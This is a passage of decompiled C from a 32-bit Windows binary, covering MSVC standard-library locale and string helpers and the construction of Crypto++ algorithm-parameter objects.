          _invalid_parameter_noinfo_noreturn();
        v7 = (_DWORD *)*(v7 - 1);
      }
      sub_46C87D(v7);
    }
    v1[8] = 0;
    v1[9] = 15;
    *(_BYTE *)v3 = 0;
    sub_46C87D(v1);
  }
}

//----- (004217C0) --------------------------------------------------------
int __thiscall sub_4217C0(_DWORD **this, int a2)
{
  int *v2; // edx
  _WORD **v3; // ecx
  _WORD *v4; // edx

  if ( !*this[8] )
    return ((unsigned __int16 (__thiscall *)(_DWORD **, int))(*this)[3])(this, a2);
  v2 = this[12];
  if ( *v2 <= 0 )
    return ((unsigned __int16 (__thiscall *)(_DWORD **, int))(*this)[3])(this, a2);
  --*v2;
  v3 = (_WORD **)this[8];
  v4 = (*v3)++;
  *v4 = a2;
  return (unsigned __int16)a2;
}

//----- (00421800) --------------------------------------------------------
char *__usercall sub_421800@<eax>(int a1@<ebp>, int a2)
{
  unsigned int v2; // edi
  int v3; // ecx
  char *v4; // esi
  int v5; // eax
  int v6; // ecx
  const char *v7; // eax
  _BYTE v9[52]; // [esp-6Ch] [ebp-78h] BYREF
  _Ctypevec v10; // [esp-38h] [ebp-44h] BYREF
  int v11; // [esp-28h] [ebp-34h]
  int v12; // [esp-24h] [ebp-30h]
  int v13; // [esp-20h] [ebp-2Ch]
  int v14; // [esp-1Ch] [ebp-28h] BYREF
  _DWORD v15[5]; // [esp-18h] [ebp-24h] BYREF
  int v16; // [esp-4h] [ebp-10h]
  int v17; // [esp+0h] [ebp-Ch]
  int v18; // [esp+4h] [ebp-8h]
  int v19; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v17 = a1;
  v18 = retaddr;
  v16 = -1;
  v15[4] = &loc_4B0998;
  v15[3] = NtCurrentTeb()->NtTib.ExceptionList;
  v15[2] = &v19;
  v11 = a2;
  v13 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)&v14, 0);
  v16 = 0;
  v2 = dword_4F0350;
  v12 = dword_4F151C;
  if ( !dword_4F0350 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v15, 0);
    LOBYTE(v16) = 1;
    if ( !dword_4F0350 )
      dword_4F0350 = ++dword_4F0338;
    LOBYTE(v16) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)v15);
    v2 = dword_4F0350;
  }
  v3 = *(_DWORD *)(a2 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(char **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(char **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v12 )
  {
    v4 = (char *)v12;
  }
  else
  {
    v4 = (char *)operator new(0x18u);
    v12 = (int)v4;
    LOBYTE(v16) = 2;
    v6 = *(_DWORD *)(v11 + 4);
    if ( v6 )
    {
      v7 = *(const char **)(v6 + 24);
      if ( !v7 )
        v7 = (const char *)(v6 + 28);
    }
    else
    {
      v7 = (const char *)&unk_4CCC25;
    }
    sub_401AF0((int)v9, v7);
    v13 = 1;
    *(_DWORD *)v4 = &std::_Facet_base::`vftable';
    *(_DWORD *)v4 = &std::locale::facet::`vftable';
    *((_DWORD *)v4 + 1) = 0;
    *(_DWORD *)v4 = &std::ctype_base::`vftable';
    v16 = 6;
    *(_DWORD *)v4 = &std::ctype<char>::`vftable';
    *(_Ctypevec *)(v4 + 8) = *_Getctype(&v10);
    v16 = 0;
    v13 = 0;
    sub_401BC0((int)v9);
    v15[0] = v4;
    LOBYTE(v16) = 8;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(char *))(*(_DWORD *)v4 + 4))(v4);
    dword_4F151C = (int)v4;
    v15[0] = 0;
    LOBYTE(v16) = 0;
  }
LABEL_20:
  v16 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)&v14);
  return v4;
}
// 421800: could not find valid save-restore pair for ebp
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';
// 4B8450: using guessed type void *std::ctype<char>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F0350: using guessed type int dword_4F0350;
// 4F151C: using guessed type int dword_4F151C;

//----- (004219F0) --------------------------------------------------------
char *__cdecl sub_4219F0(int a1)
{
  unsigned int v1; // edi
  int v2; // ecx
  char *v3; // esi
  int v4; // eax
  int v5; // ecx
  const char *v6; // eax
  _Cvtvec v8; // [esp+Ch] [ebp-84h] BYREF
  char v9[52]; // [esp+38h] [ebp-58h] BYREF
  int v10; // [esp+6Ch] [ebp-24h]
  char *v11; // [esp+70h] [ebp-20h]
  int v12; // [esp+74h] [ebp-1Ch]
  char v13[4]; // [esp+78h] [ebp-18h] BYREF
  char *v14; // [esp+7Ch] [ebp-14h] BYREF
  int v15; // [esp+8Ch] [ebp-4h]

  v10 = a1;
  v12 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)v13, 0);
  v15 = 0;
  v1 = dword_4F0344;
  v11 = (char *)dword_4F1524;
  if ( !dword_4F0344 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)&v14, 0);
    LOBYTE(v15) = 1;
    if ( !dword_4F0344 )
      dword_4F0344 = ++dword_4F0338;
    LOBYTE(v15) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)&v14);
    v1 = dword_4F0344;
  }
  v2 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v2 + 12) )
  {
    v3 = 0;
  }
  else
  {
    v3 = *(char **)(*(_DWORD *)(v2 + 8) + 4 * v1);
    if ( v3 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v2 + 20) )
    goto LABEL_12;
  v4 = sub_469E47();
  if ( v1 < *(_DWORD *)(v4 + 12) )
  {
    v3 = *(char **)(*(_DWORD *)(v4 + 8) + 4 * v1);
LABEL_12:
    if ( v3 )
      goto LABEL_20;
  }
  if ( v11 )
  {
    v3 = v11;
  }
  else
  {
    v3 = (char *)operator new(0x34u);
    v11 = v3;
    LOBYTE(v15) = 2;
    v5 = *(_DWORD *)(v10 + 4);
    if ( v5 )
    {
      v6 = *(const char **)(v5 + 24);
      if ( !v6 )
        v6 = (const char *)(v5 + 28);
    }
    else
    {
      v6 = (const char *)&unk_4CCC25;
    }
    sub_401AF0((int)v9, v6);
    v12 = 1;
    *(_DWORD *)v3 = &std::_Facet_base::`vftable';
    *(_DWORD *)v3 = &std::locale::facet::`vftable';
    *((_DWORD *)v3 + 1) = 0;
    *(_DWORD *)v3 = &std::codecvt_base::`vftable';
    v15 = 6;
    *(_DWORD *)v3 = &std::codecvt<wchar_t,char,_Mbstatet>::`vftable';
    *(_Cvtvec *)(v3 + 8) = *_Getcvt(&v8);
    v15 = 0;
    v12 = 0;
    sub_401BC0((int)v9);
    v14 = v3;
    LOBYTE(v15) = 8;
    std::_Facet_Register((struct std::_Facet_base *)v3);
    (*(void (__thiscall **)(char *))(*(_DWORD *)v3 + 4))(v3);
    dword_4F1524 = (int)v3;
    v14 = 0;
    LOBYTE(v15) = 0;
  }
LABEL_20:
  v15 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)v13);
  return v3;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';
// 4BD550: using guessed type void *std::codecvt<wchar_t,char,_Mbstatet>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F0344: using guessed type int dword_4F0344;
// 4F1524: using guessed type int dword_4F1524;
// 4219F0: using guessed type char var_18[4];

//----- (00421BF0) --------------------------------------------------------
int __fastcall sub_421BF0(int a1, char *a2, int a3)
{
  int v3; // esi
  void **v4; // edi
  unsigned int v5; // ecx
  unsigned int v6; // eax
  char *v7; // esi
  int v8; // eax
  int v9; // esi
  size_t v10; // esi
  void **v11; // eax
  unsigned int v14; // [esp+10h] [ebp-24h]
  char *Src; // [esp+1Ch] [ebp-18h]
  unsigned int v16; // [esp+20h] [ebp-14h]
  unsigned int v17; // [esp+20h] [ebp-14h]
  char *v18; // [esp+24h] [ebp-10h]
  unsigned int v19; // [esp+3Ch] [ebp+8h]

  Src = a2;
  v3 = a1;
  v4 = (void **)a3;
  v5 = *((_DWORD *)a2 + 4);
  v14 = v5;
  v19 = *(_DWORD *)(a3 + 16);
  if ( v19 <= *((_DWORD *)a2 + 5) - v5 )
  {
    v6 = v19;
  }
  else
  {
    v16 = (unsigned int)v4[5];
    v6 = v19;
    if ( v16 - v19 >= v5 )
    {
      if ( *((_DWORD *)a2 + 5) >= 8u )
      {
        a2 = *(char **)a2;
        Src = a2;
      }
      if ( v5 > v16 - v19 )
      {
        LOBYTE(v19) = 0;
        v4 = sub_426F30(v4, v5, v19, v5, a2, v5);
        goto LABEL_17;
      }
      v18 = (char *)v4;
      v7 = (char *)v4;
      v4[4] = (void *)(v5 + v19);
      if ( v16 >= 8 )
      {
        v7 = (char *)*v4;
        v18 = (char *)*v4;
      }
      if ( &a2[2 * v5] <= v7 )
      {
        v8 = 2 * v19;
      }
      else
      {
        v8 = 2 * v19;
        if ( a2 <= &v7[2 * v19] )
        {
          if ( v7 > a2 )
          {
            v9 = (v7 - a2) >> 1;
            v17 = v9;
          }
          else
          {
            v9 = 0;
            v17 = 0;
          }
          goto LABEL_15;
        }
      }
      v9 = v5;
      v17 = v5;
LABEL_15:
      memmove_0(&v18[2 * v5], v18, v8 + 2);
      v10 = 2 * v9;
      memmove(v18, Src, v10);
      memmove(&v18[v10], &Src[2 * v17 + 2 * v14], 2 * (v14 - v17));
      v3 = a1;
LABEL_17:
      *(_DWORD *)(v3 + 16) = 0;
      *(_DWORD *)(v3 + 20) = 0;
      *(_OWORD *)v3 = *(_OWORD *)v4;
      *(_QWORD *)(v3 + 16) = *((_QWORD *)v4 + 2);
      v4[4] = 0;
      v4[5] = (void *)7;
      *(_WORD *)v4 = 0;
      return v3;
    }
  }
  if ( (unsigned int)v4[5] >= 8 )
    v4 = (void **)*v4;
  v11 = sub_419370((int)a2, v4, v6);
  *(_DWORD *)(v3 + 16) = 0;
  *(_DWORD *)(v3 + 20) = 0;
  *(_OWORD *)v3 = *(_OWORD *)v11;
  *(_QWORD *)(v3 + 16) = *((_QWORD *)v11 + 2);
  v11[4] = 0;
  v11[5] = (void *)7;
  *(_WORD *)v11 = 0;
  return v3;
}

//----- (00421DC0) --------------------------------------------------------
int __fastcall sub_421DC0(int a1, int a2, unsigned int *a3)
{
  unsigned int *v4; // eax
  void **v5; // eax

  v4 = a3;
  if ( a3[5] >= 8 )
    v4 = (unsigned int *)*a3;
  v5 = sub_419370(a2, v4, a3[4]);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v5;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)7;
  *(_WORD *)v5 = 0;
  return a1;
}

//----- (00421E60) --------------------------------------------------------
int __thiscall sub_421E60(int this, unsigned int *a2, int a3)
{
  unsigned int *v4; // eax
  unsigned int v5; // ecx

  v4 = a2;
  v5 = a2[4];
  if ( a2[5] >= 8 )
    v4 = (unsigned int *)*a2;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 7;
  *(_WORD *)this = 0;
  sub_41EB20((void **)this, v4, v5);
  return this;
}

//----- (00421F20) --------------------------------------------------------
int __cdecl sub_421F20(int a1, char *a2, const char *a3)
{
  void **v3; // eax

  v3 = sub_4198A0(a2, a3);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v3;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v3 + 2);
  v3[4] = 0;
  v3[5] = (void *)15;
  *(_BYTE *)v3 = 0;
  return a1;
}

//----- (00421FB0) --------------------------------------------------------
int __cdecl sub_421FB0(int a1, char *a2, char *a3)
{
  const void **v3; // eax

  v3 = sub_41ED70(a3, 0, a2, strlen(a2));
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v3;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v3 + 2);
  v3[4] = 0;
  v3[5] = (const void *)15;
  *(_BYTE *)v3 = 0;
  return a1;
}

//----- (00422050) --------------------------------------------------------
int __fastcall sub_422050(int a1, char *a2, _DWORD *a3)
{
  void **v4; // eax

  v4 = sub_419910(a2, a3);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v4;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v4 + 2);
  v4[4] = 0;
  v4[5] = (void *)15;
  *(_BYTE *)v4 = 0;
  return a1;
}

//----- (004220E0) --------------------------------------------------------
int __cdecl sub_4220E0(int a1, int a2, char *a3)
{
  char *v3; // ecx
  unsigned int v4; // esi
  const void **v5; // eax
  int v6; // ecx
  void **v7; // eax

  v3 = (char *)a2;
  v4 = *(_DWORD *)(a2 + 16);
  if ( *((_DWORD *)a3 + 4) <= *(_DWORD *)(a2 + 20) - v4 || *((_DWORD *)a3 + 5) - *((_DWORD *)a3 + 4) < v4 )
  {
    v7 = sub_419910((char *)a2, a3);
    v6 = a1;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = *(_OWORD *)v7;
    *(_QWORD *)(a1 + 16) = *((_QWORD *)v7 + 2);
    v7[4] = 0;
    v7[5] = (void *)15;
    *(_BYTE *)v7 = 0;
  }
  else
  {
    if ( *(_DWORD *)(a2 + 20) >= 0x10u )
      v3 = *(char **)a2;
    v5 = sub_41ED70(a3, 0, v3, *(_DWORD *)(a2 + 16));
    v6 = a1;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 0;
    *(_OWORD *)a1 = *(_OWORD *)v5;
    *(_QWORD *)(a1 + 16) = *((_QWORD *)v5 + 2);
    v5[4] = 0;
    v5[5] = (const void *)15;
    *(_BYTE *)v5 = 0;
  }
  return v6;
}

//----- (004221D0) --------------------------------------------------------
int __thiscall sub_4221D0(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))*this;
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (00422210) --------------------------------------------------------
_DWORD *__cdecl sub_422210(_DWORD *a1, int a2, int a3, char a4)
{
  _DWORD *v4; // esi
  _DWORD *v5; // edi
  _DWORD *v6; // ecx
  void *v7; // eax
  void *v8; // edx
  int v9; // ebx
  void (__thiscall ***v10)(_DWORD, int); // ecx
  void (__thiscall ***v11)(_DWORD, int); // ecx
  _DWORD *v12; // esi
  int v14; // [esp-4h] [ebp-4Ch]
  int v15; // [esp+14h] [ebp-34h] BYREF
  void (__thiscall ***v16)(_DWORD, int); // [esp+18h] [ebp-30h]
  _DWORD *v17; // [esp+20h] [ebp-28h]
  _DWORD *v18; // [esp+24h] [ebp-24h]
  _DWORD *v19; // [esp+28h] [ebp-20h]
  int v20; // [esp+2Ch] [ebp-1Ch]
  _DWORD *v21; // [esp+30h] [ebp-18h]
  _DWORD *v22; // [esp+34h] [ebp-14h]
  int v23; // [esp+44h] [ebp-4h]

  v19 = a1;
  v21 = a1;
  v20 = 0;
  v4 = sub_4550C0(&v15);
  v23 = 1;
  v22 = 0;
  v5 = operator new(0x2Cu);
  v18 = v5;
  memset(v5, 0, 0x2Cu);
  v5[1] = a2;
  *v5 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  LOBYTE(v23) = 4;
  v6 = v5 + 4;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';
  *((_BYTE *)v5 + 16) = *(_BYTE *)a3;
  v5[5] = *(_DWORD *)(a3 + 4);
  v5[6] = *(_DWORD *)(a3 + 8);
  v5[8] = *(_DWORD *)(a3 + 16);
  v5[9] = *(_DWORD *)(a3 + 20);
  v7 = *(void **)(a3 + 20);
  v17 = v5 + 4;
  if ( v7 )
  {
    v7 = sub_45AEA0((size_t)v7);
    v6 = v5 + 4;
  }
  v6[6] = v7;
  v8 = *(void **)(a3 + 24);
  if ( v8 )
    sub_401670(v7, v6[5], v8, *(_DWORD *)(a3 + 20));
  v22 = v5;
  LOBYTE(v23) = 8;
  v9 = v4[1];
  v4[1] = 0;
  v10 = (void (__thiscall ***)(_DWORD, int))v5[3];
  if ( v10 )
    (**v10)(v10, 1);
  v5[3] = v9;
  v11 = (void (__thiscall ***)(_DWORD, int))v4[1];
  v22 = 0;
  if ( v11 )
    (**v11)(v11, 1);
  v4[1] = v5;
  *((_BYTE *)v4 + 8) = a4;
  LOBYTE(v23) = 1;
  v14 = (int)v4;
  v12 = v21;
  sub_455040(v21, v14);
  v20 = 1;
  v23 = 9;
  if ( v16 )
    (**v16)(v16, 1);
  return v12;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93B0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';

//----- (004223A0) --------------------------------------------------------
int __thiscall sub_4223A0(int this, int a2, _DWORD *a3)
{
  _DWORD *v4; // esi
  int v5; // eax
  void (__thiscall ***v6)(_DWORD, int); // ecx
  void (__thiscall ***v7)(_DWORD, int); // ecx
  int v9; // [esp+Ch] [ebp-1Ch]
  char v10; // [esp+13h] [ebp-15h]

  v10 = *(_BYTE *)(this + 8);
  v4 = operator new(0x14u);
  *(_OWORD *)v4 = 0i64;
  v4[4] = 0;
  v4[1] = a2;
  *v4 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v4 + 8) = v10;
  *((_BYTE *)v4 + 9) = 0;
  v4[3] = 0;
  *v4 = &CryptoPP::AlgorithmParametersTemplate<int>::`vftable';
  v4[4] = *a3;
  v5 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v6 = (void (__thiscall ***)(_DWORD, int))v4[3];
  v9 = v5;
  if ( v6 )
  {
    (**v6)(v6, 1);
    v5 = v9;
  }
  v4[3] = v5;
  v7 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v7 )
    (**v7)(v7, 1);
  *(_DWORD *)(this + 4) = v4;
  *(_BYTE *)(this + 8) = v10;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93A0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable';

//----- (004224C0) --------------------------------------------------------
_DWORD *__fastcall sub_4224C0(_DWORD *a1, int a2, _DWORD *a3)
{
  _DWORD *v4; // edi
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  _DWORD *v9; // esi
  int v11; // [esp-4h] [ebp-44h]
  int v12; // [esp+Ch] [ebp-34h] BYREF
  void (__thiscall ***v13)(_DWORD, int); // [esp+10h] [ebp-30h]
  _DWORD *v14; // [esp+18h] [ebp-28h]
  _DWORD *v15; // [esp+1Ch] [ebp-24h]
  int v16; // [esp+20h] [ebp-20h]
  _DWORD *v17; // [esp+24h] [ebp-1Ch]
  _DWORD *v18; // [esp+28h] [ebp-18h]
  _DWORD *v19; // [esp+2Ch] [ebp-14h]
  int v20; // [esp+3Ch] [ebp-4h]

  v17 = a1;
  v18 = a1;
  v15 = a1;
  v16 = 0;
  v18 = sub_4550C0(&v12);
  v20 = 1;
  v19 = 0;
  v4 = operator new(0x14u);
  v14 = v4;
  *(_OWORD *)v4 = 0i64;
  v4[4] = 0;
  *v4 = &CryptoPP::AlgorithmParametersBase::`vftable';
  v4[1] = a2;
  *((_WORD *)v4 + 4) = 1;
  v4[3] = 0;
  LOBYTE(v20) = 4;
  *v4 = &CryptoPP::AlgorithmParametersTemplate<char const *>::`vftable';
  v4[4] = *a3;
  v19 = v4;
  LOBYTE(v20) = 5;
  v5 = v18;
  v6 = (_DWORD *)v18[1];
  v18[1] = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v4[3];
  v18 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v18;
  }
  v4[3] = v6;
  v8 = (void (__thiscall ***)(_DWORD, int))v5[1];
  v19 = 0;
  if ( v8 )
    (**v8)(v8, 1);
  v5[1] = v4;
  *((_BYTE *)v5 + 8) = 1;
  LOBYTE(v20) = 1;
  v11 = (int)v5;
  v9 = v17;
  sub_455040(v17, v11);
  v16 = 1;
  v20 = 6;
  if ( v13 )
    (**v13)(v13, 1);
  return v9;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4CF674: using guessed type void *CryptoPP::AlgorithmParametersTemplate<char const *>::`vftable';

//----- (00422600) --------------------------------------------------------
_DWORD *__fastcall sub_422600(_DWORD *a1, int a2, _DWORD *a3)
{
  _DWORD *v4; // edi
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  _DWORD *v9; // esi
  int v11; // [esp-4h] [ebp-44h]
  int v12; // [esp+Ch] [ebp-34h] BYREF
  void (__thiscall ***v13)(_DWORD, int); // [esp+10h] [ebp-30h]
  _DWORD *v14; // [esp+18h] [ebp-28h]
  _DWORD *v15; // [esp+1Ch] [ebp-24h]
  int v16; // [esp+20h] [ebp-20h]
  _DWORD *v17; // [esp+24h] [ebp-1Ch]
  _DWORD *v18; // [esp+28h] [ebp-18h]
  _DWORD *v19; // [esp+2Ch] [ebp-14h]
  int v20; // [esp+3Ch] [ebp-4h]

  v17 = a1;
  v18 = a1;
  v15 = a1;
  v16 = 0;
  v18 = sub_4550C0(&v12);
  v20 = 1;
  v19 = 0;
  v4 = operator new(0x14u);
  v14 = v4;
  *(_OWORD *)v4 = 0i64;
  v4[4] = 0;
  *v4 = &CryptoPP::AlgorithmParametersBase::`vftable';
  v4[1] = a2;
  *((_WORD *)v4 + 4) = 1;
  v4[3] = 0;
  LOBYTE(v20) = 4;
  *v4 = &CryptoPP::AlgorithmParametersTemplate<wchar_t const *>::`vftable';
  v4[4] = *a3;
  v19 = v4;
  LOBYTE(v20) = 5;
  v5 = v18;
  v6 = (_DWORD *)v18[1];
  v18[1] = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v4[3];
  v18 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v18;
  }
  v4[3] = v6;
  v8 = (void (__thiscall ***)(_DWORD, int))v5[1];
  v19 = 0;
  if ( v8 )
    (**v8)(v8, 1);
  v5[1] = v4;
  *((_BYTE *)v5 + 8) = 1;
  LOBYTE(v20) = 1;
  v11 = (int)v5;
  v9 = v17;
  sub_455040(v17, v11);
  v16 = 1;
  v20 = 6;
  if ( v13 )
    (**v13)(v13, 1);
  return v9;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4CF8E4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<wchar_t const *>::`vftable';

//----- (00422740) --------------------------------------------------------
int __thiscall sub_422740(_DWORD **this, int a2, int a3, int a4)
{
  char v5; // al
  int v6; // edx
  int v8; // [esp+8h] [ebp-8h] BYREF

  (*(void (__thiscall **)(_DWORD, int, int, int))(**(this - 5) + 24))(*(this - 5), a3, a4, a2);
  ((void (__thiscall *)(_DWORD **))(*(this - 7))[16])(this - 7);
  v5 = (*(int (__thiscall **)(int, const char *, int *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "FeedbackSize",
         &int `RTTI Type Descriptor',
         &v8);
  v6 = 0;
  if ( v5 )
    v6 = v8;
  return ((int (__stdcall *)(int))(*(this - 7))[15])(v6);
}
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';

//----- (004227B0) --------------------------------------------------------
_DWORD *__cdecl sub_4227B0(_DWORD *a1, int a2, _DWORD *a3, char a4)
{
  _DWORD *v4; // edi
  _DWORD *v5; // esi
  int v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  _DWORD *v9; // esi
  int v11; // [esp+Ch] [ebp-30h] BYREF
  void (__thiscall ***v12)(_DWORD, int); // [esp+10h] [ebp-2Ch]
  _DWORD *v13; // [esp+18h] [ebp-24h]
  int v14; // [esp+1Ch] [ebp-20h]
  _DWORD *v15; // [esp+20h] [ebp-1Ch]
  int v16; // [esp+24h] [ebp-18h]
  _DWORD *v17; // [esp+28h] [ebp-14h]
  int v18; // [esp+38h] [ebp-4h]

  v13 = a1;
  v15 = a1;
  v14 = 0;
  v4 = sub_4550C0(&v11);
  v18 = 1;
  v17 = 0;
  v5 = operator new(0x14u);
  v16 = (int)v5;
  *(_OWORD *)v5 = 0i64;
  v5[4] = 0;
  v5[1] = a2;
  *v5 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  LOBYTE(v18) = 4;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
  v5[4] = *a3;
  v17 = v5;
  LOBYTE(v18) = 5;
  v6 = v4[1];
  v4[1] = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v5[3];
  v16 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v16;
  }
  v5[3] = v6;
  v8 = (void (__thiscall ***)(_DWORD, int))v4[1];
  v17 = 0;
  if ( v8 )
    (**v8)(v8, 1);
  v4[1] = v5;
  *((_BYTE *)v4 + 8) = a4;
  LOBYTE(v18) = 1;
  v9 = v15;
  sub_455040(v15, (int)v4);
  v14 = 1;
  v18 = 6;
  if ( v12 )
    (**v12)(v12, 1);
  return v9;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA178: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';

//----- (004228F0) --------------------------------------------------------
int __fastcall sub_4228F0(int a1, int a2, void *a3)
{
  void **v4; // eax

  v4 = sub_419370(a2, a3, wcslen((const unsigned __int16 *)a3));
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v4;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v4 + 2);
  v4[4] = 0;
  v4[5] = (void *)7;
  *(_WORD *)v4 = 0;
  return a1;
}

//----- (004229A0) --------------------------------------------------------
int __fastcall sub_4229A0(int a1, _DWORD *a2, unsigned __int16 *a3)
{
  _DWORD *v3; // edi
  unsigned int v5; // eax

  v3 = a2;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 7;
  *(_WORD *)a1 = 0;
  sub_419280((void **)a1, wcslen(a3) + a2[4]);
  v5 = v3[4];
  if ( v3[5] >= 8u )
    v3 = (_DWORD *)*v3;
  sub_419370(a1, v3, v5);
  sub_419370(a1, a3, wcslen(a3));
  return a1;
}

//----- (00422A70) --------------------------------------------------------
int *sub_422A70()
{
  int v0; // esi
  int v1; // eax
  unsigned int v2; // edi
  int v3; // ebx
  int v4; // ebx
  unsigned int v5; // edi
  int v6; // eax
  int v7; // eax
  int v8; // ecx
  const char *v9; // edx
  _DWORD **v10; // esi
  unsigned __int16 v11; // ax
  __int16 v12; // ax
  bool v13; // cf
  int v14; // eax
  int *v15; // edi
  char *v16; // ecx
  char v17; // al
  int v18; // ecx
  _DWORD v20[6]; // [esp+0h] [ebp-60h] BYREF
  _BYTE *v21; // [esp+18h] [ebp-48h] BYREF
  char v22; // [esp+1Ch] [ebp-44h]
  __int64 v23; // [esp+20h] [ebp-40h]
  const char *v24; // [esp+28h] [ebp-38h]
  int v25; // [esp+2Ch] [ebp-34h] BYREF
  int v26; // [esp+30h] [ebp-30h]
  char *v27; // [esp+34h] [ebp-2Ch]
  int *v28; // [esp+38h] [ebp-28h]
  const char *v29; // [esp+3Ch] [ebp-24h]
  int v30; // [esp+40h] [ebp-20h]
  int v31; // [esp+44h] [ebp-1Ch]
